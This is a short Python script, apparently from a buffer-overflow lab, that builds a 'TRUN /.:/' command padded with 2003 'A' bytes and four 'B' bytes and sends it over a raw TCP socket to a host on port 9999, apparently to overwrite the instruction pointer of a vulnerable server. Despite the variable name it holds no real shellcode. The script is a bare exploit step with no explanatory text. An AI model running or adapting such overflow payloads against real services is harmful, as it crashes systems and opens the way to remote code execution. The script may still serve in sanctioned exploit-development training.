import sys, socket

shellcode = 'TRUN /.:/' + "A" * 2003 + "B" * 4

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.102', 9999))
s.send((shellcode.encode()))
s.close()

